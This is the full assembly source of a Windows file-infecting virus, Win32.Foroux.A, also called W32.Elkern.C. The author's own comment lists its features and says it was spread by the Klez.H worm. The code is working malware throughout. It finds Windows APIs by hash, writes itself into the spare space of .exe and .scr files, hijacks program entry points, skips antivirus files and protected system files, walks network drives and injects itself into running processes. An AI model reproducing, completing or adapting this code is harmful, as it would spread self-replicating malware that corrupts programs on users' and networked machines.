
comment $
This is the source code of Win32.Foroux.A(W32.Elkern.C)
Features
1,Cavity infection.It splits itself to several small block and try to insert them
to the host body.If there is no enough cavity,it will append the block to the host
tail.I like cavity infection,and all Elkern family has such feature.
Because after such infection,maybe the file size will be enlarged,but the enlarge
size is uncertain.
2,Very good memory infection.Unlike the common method to stealth,it doesn't drop any
file to the disk.Instead that,it will infect all process current in memory(on Win98,
it will only infect Explorer to avoid crash some application(eg,OE)).This feature made
it very difficult to disinfect.
Every virus process will play its infect,but only one do very fast infection,and others
will slowly infect.This is to avoid th draw the user's notice.If the 'fast' process
exit,another virus process will become the 'fast' one.
How to infect process?Maybe you'll say CreateRemoteThread,but it's pitiful that it's
only supported by Win2000.Now I will introduce a common method which can run on all
Win32 platform.
When you get a process,insert a very short piece of virus code to its cavity,and modify
the import table to redirect a API to your code.As soon as the API is called by the
process,your code will get control and then,it can try to map a memroy map which contain
your whole virus code.If it successes to do this,then it will jump to the real virus
body.
For more information,read infproc.asm
3,Dynamic decryption and encryption.When it call a routine,it will decryption it.When the
routine returned,it will encryption with different key again.Though the encrypt algorism
is very simple,it's very difficult to obtain 'plain' virus code.
4,It will infect all .exe and .scr PE file,and randomly it will ignore the file extension
in order to infect more widely.
5,It was released by Klez.H.

I like writing several source file for my asm virus.This virus source code files is
pv.asm--the main asm file
infect.asm--the routine to infect files
infproc.asm--the routine to infect memory process
mainthrd.asm--the main loop of virus work.
But for your convenience to read,I join all files to a single file.But every file are
seperated by comment with the file name.
$
;NOTE: All global data MUST NOT be in encryption block.

.386
.model flat

include win32.inc
includelib import32.lib
        extrn MessageBoxA: proc
        extrn ExitProcess: proc
        extrn CreateProcessA: proc

DEBUG equ 1

if DEBUG
include debug.asm
endif

FMAP_NAME equ 'Wqk',0
MUTEX_NAME equ 'Oux',0

INFPROC_PROT_SIZE equ (4*1024)
INFPROC_MAP_SIZE equ (16*1024)
INF_SIGN equ 'QW'
MEM_INF_SIGN equ ('Q'+'W')
MEM_INF_POS equ 1ch
INF_MIN_BLK_SIZE equ 38h
MIN_SIZE_TO_INFECT equ (8*1024)

if DEBUG
INFECT_FIRSTDISK equ (0000ffffh and '00:w')
INFECT_LASTDISK equ (0000ffffh and '00:z')
else
INFECT_FIRSTDISK equ (0000ffffh and '00:a')
INFECT_LASTDISK equ (0000ffffh and '00:z')
endif

RESOURCETYPE_DISK equ 0001h
RESOURCEUSAGE_CONTAINER equ 0002h
RESOURCEUSAGE_ALL equ 0013h
RESOURCE_GLOBALNET equ 0002h

MAX_NETRESOURCE_NUM equ 1000

SECTION_QUERY equ 0001h
SECTION_MAP_WRITE equ 0002h
SECTION_MAP_READ equ 0004h
SECTION_MAP_EXECUTE equ 0008h
SECTION_EXTEND_SIZE equ 0010h

FILE_MAP_COPY equ SECTION_QUERY
FILE_MAP_WRITE equ SECTION_MAP_WRITE
FILE_MAP_READ equ SECTION_MAP_READ
;FILE_MAP_ALL_ACCESS equ SECTION_ALL_ACCESS

PAGE_NOACCESS equ 01h
PAGE_READONLY equ 02h
PAGE_READWRITE equ 04h
PAGE_WRITECOPY equ 08h
PAGE_EXECUTE equ 10h
PAGE_EXECUTE_READ equ 20h
PAGE_EXECUTE_READWRITE equ 40h
PAGE_EXECUTE_WRITECOPY equ 80h
PAGE_GUARD equ 100h
PAGE_NOCACHE equ 200h
PAGE_WRITECOMBINE equ 400h

MEM_COMMIT equ 1000h
MEM_RELEASE equ 8000h

MAX_PATH equ 260
MAX_DIR_SIZE equ MAX_PATH

FILETIME struc
        dwLowDateTime dd 0
        dwHighDateTime dd 0
FILETIME ends

WIN32_FIND_DATA struc
        dwFileAttributes dd 0
        ftCreationTime FILETIME <>
        ftLastAccessTime FILETIME <>
        ftLastWriteTime FILETIME <>
        nFileSizeHigh dd 0
        nFileSizeLow dd 0
        dwReserved0 dd 0
        dwReserved1 dd 0
        cFileName db MAX_PATH dup(0)
        cAlternateFileName db 14 dup(0)
        foralign db 2 dup(0)
WIN32_FIND_DATA ends

EXIT macro
        push large 0
        call ExitProcess
endm

        CALLHEADER macro entry
                dw 0
                dw entry&_end - entry
        ENDM

        SUBCALL macro sub,rel
        ;;NOTE : This macro WILL destroy ESI
                lea esi,[ebp+sub-rel]
                call _callsub
        endm

.data
        cap db 'Haha',0
        str db "Hello sakld;gjlsad",0dh,0ah,0
        dummyfile db "dummy.exe"
.code

vir_header:
        dd 0
        dw vir_size
        dw 'QW'

_start:
        pushfd ;If some flags,especial DF,changed,some APIs can crash down!!!
        pushad
        call _start_ip
_start_ip:
        pop ebp

_start_@1 equ $
        lea edi,[ebp+hash_table-8-_start_ip]
        mov ebx,[esp+9*4]
        and ebx,0ffe00000h ;98-BFF70000,2K-77E80000,XP-77E60000
_start_@2 equ $
        lea esi,[ebp+search_api_addr-_start_ip]
        call _callsub

_start_@3 equ $
        lea eax,[ebp+return_to_host-_start_ip]
        push eax
main_enter:
        lea edx,[ebp+vir_body-_start_ip]
        db 89h,0d6h ;mov esi,edx
        call _callsub
        retn
return_to_host:
        sub ebp,1000h+_start_ip-vir_header
host_section_rva equ dword ptr $-4
        add ebp,offset host-400000h
host_entry_rva equ dword ptr $-4

        mov dword ptr [ebp],000000b8h
host_entry_1 equ dword ptr $-4
        mov byte ptr [ebp+4],0
host_entry_2 equ byte ptr $-1

        mov [esp+7*4],ebp
        popad
        popfd
        jmp eax

_start_end:

CALLHEADER vir_body
vir_body:
        pushad
        call vir_body_ip
vir_body_ip:
        pop ebp

        SUBCALL merge_code,vir_body_ip
        or eax,eax
        jz short vir_body_ret

        add eax,main_thread-_start

        mov esi,eax
        call blk_decrypt
        mov word ptr [esi-4],0 ;Clear the encryption key to avoid incorrect encryption when error occurs

        xor ecx,ecx
        push ecx
        push esp
        push ecx
        push ecx
        push eax
        push ecx
        push ecx
        call [ebp+addrCreateThread-vir_body_ip]
        pop ecx
        
vir_body_ret:
        popad
        retn
vir_body_end:


;out--eax=buffer address
CALLHEADER merge_code
merge_code:
merge_code_ip equ vir_body_ip
        xor edi,edi
        mov eax,vir_mem_size
        SUBCALL create_mem_map,merge_code_ip
        push eax
        jz short merge_code_ret
        cld
        mov edi,eax
        lea esi,[ebp+_start-merge_code_ip]
        lea edx,[ebp+_start_ip-merge_code_ip]
        sub edx,[ebp+host_section_rva-merge_code_ip]
        sub esi,edx
merge_code_loop:
        add esi,edx
        movzx ecx,word ptr [esi-4]
        push esi
        rep movsb
        pop esi
        mov esi,[esi-8]
        or esi,esi
        jnz short merge_code_loop
merge_code_ret:
        pop eax
        retn
merge_code_end:


;in--eax=size,edi->object name
;out--eax=buffer address,edi=map handle,ZF set means fail
CALLHEADER create_mem_map
create_mem_map:
        push ebp
        push ebx
        push ecx

        call create_mem_map_ip
create_mem_map_ip:
        pop ebp

        push edi
        push eax
        xor eax,eax
        push eax
        push large PAGE_READWRITE
        push eax
        dec eax
        push eax
        call [ebp+addrCreateFileMappingA-create_mem_map_ip]
        or eax,eax
        jz short create_mem_map_1
        xchg eax,edi

        xor eax,eax
        push eax
        push eax
        push eax
        push large FILE_MAP_WRITE
        push edi
        call [ebp+addrMapViewOfFile-create_mem_map_ip]
create_mem_map_1:
        pop ecx
        pop ebx
        pop ebp
        or eax,eax
        retn
create_mem_map_end:


;In--esi->destination address
;Header format,2 byte:key,2 byte: length
;CAN NOT call get_rand
_callsub:
        call blk_decrypt
call_sub_1:
        push dword ptr [esi-4]
        mov word ptr [esi-4],0 ;Clear the encryption key to avoid incorrect encryption when error occurs
        push esi
        call esi
        pop esi
        pop dword ptr [esi-4]
        pushfd
        add word ptr [esi-4],5678h
callsub_seed equ $-2
        call blk_encrypt
        popfd
        retn

;in--esi->block entry
blk_decrypt equ blk_encrypt
blk_encrypt:
        pushad
        cld
        mov edi,esi
        mov edx,[esi-4]
blk_encrypt_@1 equ $-blk_encrypt
        xor ecx,ecx
        nop ;for poly
        shld ecx,edx,0fh
blk_encrypt_1:
        lodsw
        xor ax,dx
        stosw
        loop blk_encrypt_1
        popad
        retn


;***************************Find import some APIs*********************
HASH16FACTOR = 0ED388320h
    HASH16 MACRO String,sym
            HASH_Reg = 0FFFFFFFFh
            IRPC _x, <String>
            Ctrl_Byte = ('&_x&' XOR (HASH_Reg AND 0FFh))
            HASH_Reg = (HASH_Reg SHR 8)
            REPT 8
            Ctrl_Byte = (Ctrl_Byte SHR 1) XOR (HASH16FACTOR * (Ctrl_Byte AND 1))
            ENDM
            HASH_Reg = (HASH_Reg XOR Ctrl_Byte)
            ENDM
            sym DW (HASH_Reg AND 0FFFFh)
    ENDM

;in--ebx is the base to search-10000h,edi->the hash table,include dll name
CALLHEADER search_api_addr
search_api_addr:
        pushad
        pushfd
        call search_api_addr_ip
search_api_addr_ip:
        pop ebp
        push ebp
        lea eax,[ebp+search_api_addr_seh-search_api_addr_ip]
        push eax
        xor ecx,ecx
        push dword ptr fs:[ecx]
        mov fs:[ecx],esp

search_api_addr_@1:
        add ebx,10000h
        jz short search_api_addr_seh_restore
        cmp word ptr [ebx],'ZM'
        jnz short search_api_addr_@1
        mov eax,[ebx+3ch]
        add eax,ebx
        cmp word ptr [eax],'EP'
        jnz short search_api_addr_@1
        mov eax,[eax+78h]
        add eax,ebx
        mov edx,[eax+3*4]
        add edx,ebx
        mov ecx,[edi]
        cmp dword ptr [edx],ecx
        jnz short search_api_addr_@1
        mov ecx,[edi+4]
        cmp dword ptr [edx+4],ecx
        jnz short search_api_addr_@1

search_api_addr_seh_restore:
        xor ecx,ecx
        POP    DWord Ptr FS:[ecx]  ; restore except chain
        pop esi
        pop esi
        add edi,8
        or ebx,ebx
        jz short search_api_addr_ret
        SUBCALL find_all_exportfunc,search_api_addr_ip
search_api_addr_ret:
        popfd
        popad
        retn

search_api_addr_seh:
        call search_api_addr_seh_ip
search_api_addr_seh_ip:
        pop eax
        lea eax,[eax-(search_api_addr_seh_ip-search_api_addr_@1)]
seh_cont:
        PUSH  eax
        MOV   EAX,[ESP + 00Ch+4]          ; context
        POP   DWord Ptr [EAX + 0B8h]     ; context.eip = @ExceptProc
        XOR   EAX,EAX                    ; 0 = ExceptionContinueExecution
        RET
search_api_addr_end:

CALLHEADER find_all_exportfunc
find_all_exportfunc:
        cld
        dec ecx
        push eax
        xor eax,eax
        repnz scasw
        not ecx
        dec ecx
        push ecx
        push edi
        rep stosd ;Clear all API address
        pop edi
        sub edi,4
        pop ecx
        pop eax

        mov esi,[eax+8*4]
        add esi,ebx ;esi->name RVA array
        mov esi,[esi]
        add esi,ebx
        xor edx,edx
        push ecx

find_exportfunc:
        push ecx
find_exportfunc_1:
        cmp edx,[eax+6*4]
        pop ecx
        jz short find_exportfunc_ret
        push ecx
        inc edx
        push eax
        call calc_hash16
        push edi
        std
        mov ecx,[esp+3*4]
        repnz scasw
        pop edi
        pop eax
        jnz short find_exportfunc_1

        push edx
        dec edx
        push edi
        mov edi,[eax+9*4]
        add edi,ebx ;edi->ordinal array
        movzx edx,word ptr [edi+edx*2]
        mov edi,[eax+7*4]
        add edi,ebx ;edi->function RVA
        mov edx,[edi+edx*4]
        add edx,ebx
        pop edi
        mov [edi+ecx*4+4],edx
        pop edx
        pop ecx
        loop find_exportfunc

find_exportfunc_ret:
        pop ecx
        retn
find_exportfunc_end:

calc_hash16:
;esi->string
        push edx
        push 0ffffffffh
        pop edx
        cld
load_character:
        lodsb
        or al, al
        jz exit_calc_crc
        xor dl, al
        mov al, 8
crc_byte:
        shr edx, 1
        jnc loop_crc_byte
        xor edx, HASH16FACTOR
loop_crc_byte:
        dec al
        jnz crc_byte
        jmp load_character
exit_calc_crc:
        xchg edx, eax
;now ax is the hash 16,esi->string after the NULL character after last string
        pop edx
        ret
calc_hash16_end:

find_all_exportfunc_end:

        db 'KERNEL32'
hash_table equ this word
        HASH16 <SetEndOfFile>,hsSetEndOfFile
        HASH16 <SetFilePointer>,hsSetFilePointer
        HASH16 <CreateFileA>,hsCreateFileA
        HASH16 <GetFileAttributesA>,hsGetFileAttributesA
        HASH16 <SetFileAttributesA>,hsSetFileAttributesA
        HASH16 <CloseHandle>,hsCloseHandle
        HASH16 <GetFileTime>,hsGetFileTime
        HASH16 <SetFileTime>,hsSetFileTime
        HASH16 <GetFileSize>,hsGetFileSize

        HASH16 <CreateFileMappingA>,hsCreateFileMappingA
        HASH16 <MapViewOfFile>,hsMapViewOfFile
        HASH16 <UnmapViewOfFile>,hsUnmapViewOfFile
        HASH16 <OpenFileMappingA>,hsOpenFileMappingA
        
        HASH16 <VirtualProtectEx>,hsVirtualProtectEx
        HASH16 <ReadProcessMemory>,hsReadProcessMemory
        HASH16 <WriteProcessMemory>,hsWriteProcessMemory
        HASH16 <OpenProcess>,hsOpenProcess

        HASH16 <FindFirstFileA>,hsFindFirstFileA
        HASH16 <FindNextFileA>,hsFindNextFileA
        HASH16 <FindClose>,hsFindClose

        HASH16 <LoadLibraryA>,hsLoadLibraryA
        HASH16 <CreateThread>,hsCreateThread
        HASH16 <MultiByteToWideChar>,hsMultiByteToWideChar
        HASH16 <Sleep>,hsSleep
        HASH16 <lstrcmpiA>,hslstrcmpi
        HASH16 <GetModuleFileNameA>,hsGetModuleFileNameA
        HASH16 <GetDriveTypeA>,hsGetDriveTypeA
        HASH16 <GetTickCount>,hsGetTickCount
        HASH16 <GetVersion>,hsGetVersion
        
        HASH16 <CreateToolhelp32Snapshot>,hsCreateToolhelp32Snapshot
        HASH16 <Process32First>,hsProcess32First
        HASH16 <Process32Next>,hsProcess32Next

if DEBUG
        HASH16 <OutputDebugStringA>,hsOutputDebugStringA
        HASH16 <GetLastError>,hsGetLastError
        HASH16 <ExitProcess>,hsExitProcess
endif

        dw 0

hash_addr equ this dword
        addrSetEndOfFile dd 0
        addrSetFilePointer dd 0
        addrCreateFileA dd 0
        addrGetFileAttributesA dd 0
        addrSetFileAttributesA dd 0
        addrCloseHandle dd 0
        addrGetFileTime dd 0
        addrSetFileTime dd 0
        addrGetFileSize dd 0

        addrCreateFileMappingA dd 0
        addrMapViewOfFile dd 0
        addrUnmapViewOfFile dd 0
        addrOpenFileMappingA dd 0

        addrVirtualProtectEx dd 0
        addrReadProcessMemory dd 0
        addrWriteProcessMemory dd 0
        addrOpenProcess dd 0

        addrFindFirstFileA dd 0
        addrFindNextFileA dd 0
        addrFindClose dd 0

        addrLoadLibraryA dd 0
        addrCreateThread dd 0
        addrMultiByteToWideChar dd 0
        addrSleep dd 0
        addrlstrcmpiA dd 0
        addrGetModuleFileNameA dd 0
        addrGetDriveTypeA dd 0
        addrGetTickCount dd 0
        addrGetVersion dd 0
        
        addrCreateToolhelp32Snapshot dd 0
        addrProcess32First dd 0
        addrProcess32Next dd 0

if DEBUG
        addrOutputDebugStringA dd 0
        addrGetLastError dd 0
        addrExitProcess dd 0
endif


        db 'sfc.dll',0
sfc_hash_table equ this word
        HASH16 <SfcIsFileProtected>,isSfcIsFileProtected
        dw 0
sfc_hash_addr equ this dword
        addrSfcIsFileProtected dd 0


        db 'MPR.dll',0
mpr_hash_table equ this word
        HASH16 <WNetOpenEnumA>,hsWNetOpenEnumA
        HASH16 <WNetEnumResourceA>,hsWNetEnumResourceA
        HASH16 <WNetCloseEnum>,hsWNetCloseEnum
        dw 0
mpr_hash_addr equ this dword
        addrWNetOpenEnumA dd 0
        addrWNetEnumResourceA dd 0
        addrWNetCloseEnum dd 0
        
        
        db 'USER32.d'
user32_hash_table equ this word
        HASH16 <DispatchMessageA>,hsDispatchMessageA
        HASH16 <DispatchMessageW>,hsDispatchMessageW
        dw 0
user32_hash_addr equ this dword
        addrDispatchMessageA dd 0
        addrDispatchMessageW dd 0

;***************************Find import APIs end*********************

vir_first_blk_size equ $-_start


;*******************************infect.asm*****************************
;include infect.asm
FOPESP_BASE equ 0

;In--edi->file name,dl=operation code
CALLHEADER file_operate
file_operate:
        pushad

        call file_op_ip
file_op_ip:
        pop ebp

        mov ebx,edi
        SUBCALL is_in_dllcache,file_op_ip
        jz file_op_ret

        xor esi,esi

        push ebp
        lea eax,[ebp+file_op_seh-file_op_ip]
        push eax
        xor eax,eax
        push dword ptr fs:[eax]
        mov fs:[eax],esp

        push edi
        call [ebp+addrGetFileAttributesA-file_op_ip]
        push eax ;esp->file attribute

        push edi ;esp->file name pointer

        test eax,FILE_ATTRIBUTE_READONLY
        jz short file_op_not_readonly
        and eax,not FILE_ATTRIBUTE_READONLY
        push eax
        push edi
        call [ebp+addrSetFileAttributesA-file_op_ip]

file_op_not_readonly:
        push esi
        push large FILE_ATTRIBUTE_ARCHIVE or FILE_ATTRIBUTE_HIDDEN
        push large OPEN_EXISTING
        push esi
        push large FILE_SHARE_READ
        push large GENERIC_WRITE or GENERIC_READ
        push edi
        call [ebp+addrCreateFileA-file_op_ip]
        inc eax
        jz file_op_fail_createfile
        dec eax
        push eax ;esp->file handle

        lea ebx,[ebp+ftime-file_op_ip]
        push ebx ;ebx->file last write time
        add ebx,8
        push ebx
        add ebx,8
        push ebx
        push eax
        call [ebp+addrGetFileTime-file_op_ip]

        push ecx
        push esp ;->file size high
        push dword ptr [esp+2*4]
        call [ebp+addrGetFileSize-file_op_ip]
        pop ecx
        inc eax
        jz file_op_fail_getfilesize
        dec eax
        or ecx,ecx
        jnz file_op_fail_getfilesize
        push eax ;esp->file size
        xchg eax,edi

        add edi,vir_size+8+1000h ;edi=max file size
        push esi
        push edi
        push esi
        push large PAGE_READWRITE
        push esi
        push dword ptr [esp+5*4+4]
        call [ebp+addrCreateFileMappingA-file_op_ip]
        or eax,eax
        jz file_op_fail_createfilemapping
        push eax ; esp->save file mapping handle

        push edi
        push esi
        push esi
        push large FILE_MAP_WRITE
        push eax
        call [ebp+addrMapViewOfFile-file_op_ip]
        or eax,eax
        jz file_op_fail_mapviewoffile
        push eax ;esp->save file mapping base pointer

        mov [ebp+file_op_esp-file_op_ip],esp

;************************************************************************
;Now ebp->file_op_ip eax->file base(image base)
;esp->file mapping base address
;esp+4->file mapping handle
;esp+8h->file size
;esp+0ch->file handle
;esp+10h->file name pointer
;esp+14h->file attribute
;Les's begin file operation
;************************************************************************

        xchg ebx,eax
        SUBCALL check_pe,file_op_ip
        jz short file_op_unmapping_jmp1

;Check AV file by look for 'irus' in the file
        mov ecx,[esp+8]
        cmp ecx,MIN_SIZE_TO_INFECT
        jc file_op_unmapping

        pushad
        add ecx,eax
        sub ecx,ebx
        sub ecx,8
        mov edi,eax
        mov eax,'suri' ;V irus

check_av_1:
        sub edi,3
        scasd
        loopnz short check_av_1
        or ecx,ecx
        popad
        jnz short file_op_unmapping_jmpnz

;Let's check whether this file is under file protect,if so,not infect it,avoid WFP error
        mov ecx,[ebp+addrSfcIsFileProtected-file_op_ip]
        jecxz file_op_check_wfp_end
        pushad

;check_wfp:
        mov edi,640
        sub esp,edi
        mov ebx,esp

        push ecx

        push edi
        push ebx ;lpWideCharStr
        push -1
        push dword ptr [esp+edi+FOPESP_BASE+4*4+8*4+10h]
        push large 1 ;MB_PRECOMPOSED
        push large 0 ;CP_ACP
        call [ebp+addrMultiByteToWideChar-file_op_ip]

        pop eax
        push esp
        push large 0
        call eax

        add esp,edi

        or eax,eax
        popad

file_op_unmapping_jmpnz:
        jnz file_op_unmapping
file_op_check_wfp_end:
        
;Check whether it's a WinZip Self-Extractor file
        movzx edx,word ptr [eax+14h]
        mov edx,[eax+edx+18h+14h+28h] ;ebx->the second section's PointerToRawData
        add edx,ebx
        cmp dword ptr [edx+10h],'ZniW'
        jnz not_winzip
        cmp word ptr [edx+10h+4],'pi'
file_op_unmapping_jmp1:
        jz file_op_unmapping
not_winzip:

;Check whether the file is a SFX(RAR file)
        xor edi,edi
        SUBCALL get_section_of_rva,file_op_ip
        mov ecx,[edx+0ch]
        add ecx,[edx+8]
        mov esi,ecx
        shr ecx,3
        add ecx,esi
        cmp ecx,[esp+FOPESP_BASE+8]
        jna file_op_unmapping
        add esi,ebx ;now ecx->perhaps rar file header
        cmp dword ptr [esi],21726152h ;test for rar signature
        jz short file_op_unmapping_jmp1

;Check infected
        mov edi,[eax+28h]
        SUBCALL get_section_of_rva,file_op_ip
        sub edi,[edx+4]
        add edi,[edx+0ch]
        add edi,ebx

        lea esi,[ebp+infbuffer-file_op_ip]
        mov ecx,[edi]
        mov [esi+host_entry_1-_start],ecx
        mov cl,[edi+4]
        mov [esi+host_entry_2-_start],cl
        mov [ebp+entry_point-file_op_ip],edi

        cmp byte ptr [edi],0e9h
        jnz short check_infected_not_epo
        add edi,[edi+1]
        add edi,5
check_infected_not_epo:
        cmp word ptr [edi-2],INF_SIGN
        jnz short check_infected_end
        cmp word ptr [edi+3],0h
        jz file_op_unmapping_jmp1
check_infected_end:
;For EPO purpose,we must set the code section writable
        or dword ptr [edx+1ch],00000020h or 00000040h or 10000000h or 20000000h or 40000000h or 80000000h ; modify section's Characteristics

        lea esi,[ebp+infbuffer-file_op_ip]
        mov dword ptr [ebp+blk_min_size-file_op_ip],vir_first_blk_size+8
        mov dword ptr [ebp+remaind_size-file_op_ip],vir_size
        xor edx,edx
        mov [ebp+block_pointer-file_op_ip],edx
        cld

first_section:
        movzx edx,word ptr [eax+14h]
        lea edx,[eax+edx+18h+8-28h] ;->before first section header.VirtualSize
next_section:
        add edx,28h
        mov ecx,[edx] ;VirtualSize
        mov edi,[edx+8] ;SizeOfRawData
        cmp ecx,edi
        jna short file_op_1
        xchg edi,ecx
file_op_1:
        add ecx,[edx+0ch]
        mov edi,vir_first_blk_size+8+38h
        call is_final_section
        jz short inf_at_tail
        mov edi,[edx+28h+0ch]
        sub edi,ecx
        cmp edi,vir_first_blk_size+8
blk_min_size equ $-4
;NOTE:Next section's PointerToRawData may be 0 or less than current PointerToRawData 
;if so,don't use this section.So use jl instead of jc
        jl goto_next_section
inf_at_tail:
;Some PE file's .BSS(uninitialized data) and .TLS section's PointerToRawData can be 0,it doesn't take
;disk space.If infect this kind of section,the file will be damaged.So must avoid it.
        cmp dword ptr [edx+0ch],0 ;this section's PointerToRawData==0?
        jz goto_next_section

        xchg edi,ecx
        add edi,[esp]
        mov dword ptr [edi],0
        sub ecx,8
        cmp ecx,[ebp+remaind_size-file_op_ip]
        jl short file_op_8
        mov ecx,[ebp+remaind_size-file_op_ip]
file_op_8:
        sub [ebp+remaind_size-file_op_ip],ecx
        mov dword ptr [edi+4],ecx
        add edi,8
        mov ebx,12345678h
block_pointer equ $-4
        or ebx,ebx
        jz short file_op_7
        push edi
        sub edi,[edx+0ch]
        add edi,[edx+4]
        sub edi,[esp+4]
        mov [ebx-8],edi
        pop edi
file_op_7:
        mov [ebp+block_pointer-file_op_ip],edi
        lea ebx,[ebp+infbuffer-file_op_ip+vir_first_blk_size-10h]
        cmp esi,ebx ;is first block?
        ja file_op_2 ;No
        mov word ptr [edi-2],INF_SIGN
        or dword ptr [edx+1ch],00000020h or 00000040h or 10000000h or 20000000h or 40000000h or 80000000h ; modify section's Characteristics
        
;Check relocation,try to implement EPO

        mov ebx,[eax+28h] ;AddressOfEntryPoint 
        mov [esi+host_entry_rva-_start],ebx ;save host code entry

        pushad

        sub edi,[edx+0ch]
        add edi,[edx+4]
        sub edi,[esp+FOPESP_BASE+8*4]
        mov [ebp+redir_entry_point-file_op_ip],edi
        add edi,(_start_ip-_start)
        mov [esi+host_section_rva-_start],edi ;save host code base

        mov ecx,[eax+0a0h] ;Relocation RVA
        or ecx,ecx
        jz short chk_reloc_end
        mov edi,ecx
        SUBCALL get_section_of_rva,file_op_ip
        sub edi,[edx+4]
        add edi,[edx+0ch]
        add edi,[esp+FOPESP_BASE+8*4] ;Physical address
        mov esi,edi
        xor ecx,ecx

next_reloc_trunk:
        add esi,ecx
        lodsd
        mov edx,eax
        lodsd
        mov ecx,eax
        sub ecx,8
        clc
        or edx,edx
        jz short chk_reloc_end
        cmp ebx,edx
        jc short next_reloc_trunk
        push edx
        add edx,1000h
        cmp ebx,edx
        pop edx
        ja short next_reloc_trunk
;Found the fit trunk
        shr ecx,1
        xor eax,eax
        mov edi,edx

chk_reloc_1:
        lodsw
        or eax,eax
        jz short chk_reloc_end
        and eax,0fffh
        add edx,eax
        mov eax,ebx
        sub eax,3
        cmp edx,eax
        jc short chk_reloc_2
        add eax,8
        cmp edx,eax
        jc short chk_reloc_3
chk_reloc_2:
        mov edx,edi
        loop chk_reloc_1

chk_reloc_3:
        or ecx,ecx
chk_reloc_end:

        popad
        mov dword ptr [eax+28h],12345678h
redir_entry_point equ $-4
        pushad
        jnz short epo_end
        mov [eax+28h],ebx ;restore entry point
        mov ebx,12345678h
entry_point equ $-4

        mov byte ptr [ebx],0e9h
        sub edi,[esp+8*4]
        sub edi,[edx+0ch]
        add edi,[edx+4]
        sub edi,[eax+28h]
        sub edi,5
        mov [ebx+1],edi
        
epo_end:
        popad

file_op_2:
        mov dword ptr [ebp+blk_min_size-file_op_ip],INF_MIN_BLK_SIZE

        pushad
        sub edi,[edx+0ch]
        add edi,[edx+4]
        mov ebx,[edx] ;VirtualSize
        mov edi,[edx+8] ;SizeOfRawData
        xor esi,esi
        cmp ebx,edi
        jna short file_op_3
        xchg edi,ebx
        inc esi
file_op_3:
        add ebx,ecx
        add ebx,8
file_op_4:
        cmp ebx,edi ;is bigger one less than small one?
        jna short file_op_5 ;no
        add edi,[eax+3ch] ;FileAlignment
        jmp short file_op_4
file_op_5:
        or esi,esi
        jz short file_op_6
        xchg edi,ebx
file_op_6:
        mov [edx],ebx
        mov [edx+8],edi
        popad

        rep movsb
        or dword ptr [edx+1ch],00000040h or 40000000h; modify section's Characteristics
        and dword ptr [edx+1ch],not 02020000 ;delete discardable Characteristics

goto_next_section:
        mov ecx,vir_size
remaind_size equ $-4
        jecxz file_op_ok
        call is_final_section
        jnz next_section
        jmp first_section
file_op_ok:
        xor edi,edi
        SUBCALL get_section_of_rva,file_op_ip

;Round image size
        mov ecx,[edx]
        add ecx,[edx+4]
        mov ebx,[eax+50h]
file_op_9:
        cmp ecx,ebx
        jbe short file_op_10
        add ebx,[eax+38h]
        jmp short file_op_9
file_op_10:
        mov [eax+50h],ebx

;Round physical size
        mov ecx,[edx+8]
        add ecx,[edx+0ch]
        cmp ecx,[esp+8]
        jc short file_op_11
        mov [esp+8],ecx
file_op_11:
                                

        pop esi ;esi=file base
        push esi

        mov byte ptr [esi+MEM_INF_POS],MEM_INF_SIGN ;Set memory infected sign.

;Recalculate checksum if there is any
        lea ebx,[eax+58h]
        mov ecx,[ebx] ;Is the checksum zero?
        jecxz no_checksum ;Yes,it's zero,nothing to do;
;Now let me calculate the checksum
        mov dword ptr [ebx],0 ;zero the checksum

        mov ecx,[esp+8] ;the file size
        push ecx ;the file size after infect
        shr ecx,1
        xor edx,edx
checksum_loop:
        movzx   eax, word ptr [esi]
        add     edx, eax
        mov     eax, edx
        and     edx, 0ffffh     
        shr     eax, 10h
        add     edx, eax
        inc esi
        inc esi
        loop checksum_loop

        mov     eax, edx
        shr     eax, 10h
        add     ax, dx
        pop ecx
        add     eax,ecx
;Now eax is the checksum,store it
        mov [ebx],eax

no_checksum:

file_op_unmapping:

        mov esp,12345678h
file_op_esp equ $-4

;Now esp have point to file mapping base pointer
        call [ebp+addrUnmapViewOfFile-file_op_ip]
file_op_fail_mapviewoffile:
        call [ebp+addrCloseHandle-file_op_ip] ;Close file mapping
file_op_fail_createfilemapping:
        pop eax ;eax=file size
        push large 0
        push large 0
        push eax
        push dword ptr [esp+4*3]
        call [ebp+addrSetFilePointer-file_op_ip]

        push dword ptr [esp]
        call [ebp+addrSetEndOfFile-file_op_ip] ;truncate the file to fit size

file_op_fail_getfilesize:
        pop eax
        push eax
        lea ebx,[ebp+ftime-file_op_ip]
        push ebx ;ebx->file last write time
        add ebx,8
        push ebx
        add ebx,8
        push ebx
        push eax
        call [ebp+addrSetFileTime-file_op_ip]

        call [ebp+addrCloseHandle-file_op_ip] ;Close file
file_op_fail_createfile:
        call [ebp+addrSetFileAttributesA-file_op_ip]

        xor ecx,ecx
        POP    DWord Ptr FS:[ecx]  ; restore except chain
        pop ecx
        pop ecx
file_op_ret:
        popad
        retn

file_op_seh:
        call file_op_seh_ip
file_op_seh_ip:

        pop eax
        lea eax,[eax-(file_op_seh_ip-file_op_unmapping)]
        PUSH  eax
        MOV   EAX,[ESP + 00Ch+4]          ; context
        POP   DWord Ptr [EAX + 0B8h]     ; context.eip = @ExceptProc
        XOR   EAX,EAX                    ; 0 = ExceptionContinueExecution
        RET

;in--edx->current section VirtualSize,eax->PE base,ebx->base address,ebp->file_op_ip
;out--ZF set is final,ZF cleared isn't final
is_final_section:
        pushad
        mov ecx,edx
        xor edi,edi
        SUBCALL get_section_of_rva,file_op_ip
        cmp ecx,edx
        popad
        retn
is_final_section_end:

file_operate_end:
;*******************************infect.asm end*****************************

;*******************************infproc.asm*****************************
;include infproc.asm
;Code to inject to process
CALLHEADER inject_code
inject_code:
        jmp short $+2
inject_code_flow equ $-1
        pushad
        pushfd
        call inject_code_ip
inject_code_ip:
        pop ebp

        xor esi,esi

        call inject_code_1
        db FMAP_NAME
inject_code_1:
        push esi
        push large FILE_MAP_WRITE
        mov edx,12345678h
inject_code_openfilemapping equ $-4
        call edx
        or eax,eax
        jz short inject_code_goto_raw

        push esi
        push esi
        push esi
        push large FILE_MAP_WRITE
        push eax
        mov edx,12345678
inject_code_mapviewoffile equ $-4
        call edx
        or eax,eax
        jz short inject_code_goto_raw

        mov byte ptr [ebp+inject_code_flow-inject_code_ip],inject_code_goto_raw_1-inject_code_flow-1

        lea ebp,[eax+_start_ip-vir_header]
        add eax,main_enter-vir_header
        call eax

inject_code_goto_raw:
        popfd
        popad
inject_code_goto_raw_1:
        push large 12345678h
inject_code_raw_api equ $-4
        retn
inject_code_end:
